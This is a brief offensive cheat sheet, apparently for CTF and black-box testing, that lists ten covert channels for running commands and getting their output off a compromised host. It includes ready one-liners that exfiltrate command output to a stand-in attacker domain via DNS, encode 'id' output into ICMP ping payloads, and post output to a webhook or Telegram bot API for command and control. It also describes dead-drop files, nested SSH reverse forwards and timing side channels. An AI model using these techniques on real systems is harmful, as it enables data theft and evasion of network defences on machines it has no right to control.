# Command Execution Styles

1. DNS Tunneling Shell

· No direct outbound TCP? Exfil command output via DNS queries
· ping -c 1 $(whoami | base64).attacker.com
· Two-way via TXT record lookups

2. ICMP Exfiltration (ping shell)

· Encode data in ICMP echo payloads
· Server listens for ping -p $(id | xxd -p) patterns

3. Email-based Shell

· Send commands via SMTP to a mailbox the server can read
· Send results back via sendmail or mail() function
· Painfully slow but hilarious in black boxes

4. Telegram/Matrix/Slack Bot Shell

· Command & control via chat API
· curl -X POST "https://api.telegram.org/..." with output
· Looks like legit API traffic

5. Webhook-based (no listener needed)

· curl output to https://webhook.site/your-id
· Send new commands via If-None-Match header or cache-bust param

6. File-based (dead drop)

· Write output to /var/www/html/output.txt
· Attacker polls for new commands in a shared file
· Serverless, zero listener on attacker side

7. SSH Reverse Port Forward (nested)

· No direct socket? Use ssh -R to tunnel through a jump box
· Then forward again through another

8. Serial port / dev device shells (embedded CTFs)

· Write to /dev/ttyUSB0 on a router
· Read from /dev/ttyS0 — no network at all

9. Side-channel timing shell

· One bit per request — long delay = 1, short = 0
· "Is flag.txt present?" → measure response time

10. Audio/RGB keyboard light shell (very niche)

· Beep on beep command for binary output
· Keyboard LEDs via setleds